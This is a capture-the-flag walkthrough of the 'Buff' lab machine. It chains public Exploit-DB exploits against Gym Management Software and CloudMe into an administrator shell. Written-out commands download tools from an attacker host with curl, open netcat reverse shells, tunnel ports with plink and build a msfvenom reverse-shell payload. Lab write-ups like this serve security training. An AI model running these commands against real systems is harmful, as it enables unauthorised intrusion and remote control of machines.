# BUFF

### User Flag

```
user@kali:~$ nmap -Pn  10.10.10.198
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 11:34 CEST
Nmap scan report for 10.10.10.198
Host is up (0.19s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

In the contact page we found that the webpage is made with `Gym Management Software 1.0 `
For wich you can find and exploit in [Exploit-DB](https://www.exploit-db.com/exploits/48506)

```
kali@kali:~/hacking/buff$ python3 48506.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                                                                                                                                     
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload>
```

To copy files, we start apache2 in our machine:

```
user@kali:~$ sudo systemctl start apache2
user@kali:/var/www/html$ sudo cp /usr/share/windows-binaries/nc.exe .
user@kali:/var/www/html$ sudo cp /usr/share/windows-binaries/plink.exe .
```

And we copy them into Windows using curl:

```
C:\xampp\htdocs\gym\upload> curl 10.10.14.130/nc.exe -o nc.exe
C:\xampp\htdocs\gym\upload> curl 10.10.14.130/plink.exe -o plink.exe
```

We can get a true cmd terminal using netcat. In our machine we listen in a port and we run netcat in Windows:

```
C:\xampp\htdocs\gym\upload> nc.exe 10.10.14.130 1025 -e cmd
```

```
user@kali:/var/www/html$ nc -l -vvv -p 1025
listening on [any] 1025 ...
10.10.10.198: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.130] from (UNKNOWN) [10.10.10.198] 52172
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>

```

### Root FLag

Run Winpeas to detect possible vulnerabilities:

```
C:\xampp\htdocs\gym\upload> curl 10.10.14.130/winPEASx64.exe -o winpeas.exe
```
Cnce you use winpeas you will found a Software called cloudme in the version 1.10.0, which [can be exploited](https://www.exploit-db.com/exploits/44470). CloudMe runs on port 8888. However, the firewall is blocking it. Thus, we need to do a tunnel so we can access port 8888 from the outside. To do this, we use plink.

```
plink.exe -v user@10.10.14.130 -R 8888:127.0.0.1:8888
```

With this, plink can't connect to our machine. I don't know why, but it can't connect to port 22 (maybe the firewall?). We change our port in the sshd daemon to 10001 and run plink again.

```
plink.exe -v user@10.10.14.130 -R 8888:127.0.0.1:8888 -P 10001
```

This time, plink complains because it can't connect using any available algorithm. In our machine, we enable additional key exchange algorithm (edit sshd_config):

```
KexAlgorithms +diffie-hellman-group1-sha1
Ciphers +aes128-cbc
```

Then we are able to run plink. Now, we need to generate the payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.130 LPORT=5000 -f c
```

And we replace it in the script 44470.py. Finally:

```
user@kali:~/hacking/buff$ nc -l -vvv -p 5000
```

And we run the exploit:

```
user@kali:~/hacking/buff$ python 44470.py
```

The machine will connect to the previous netcat listening in port 5000, giving us an administrator shell
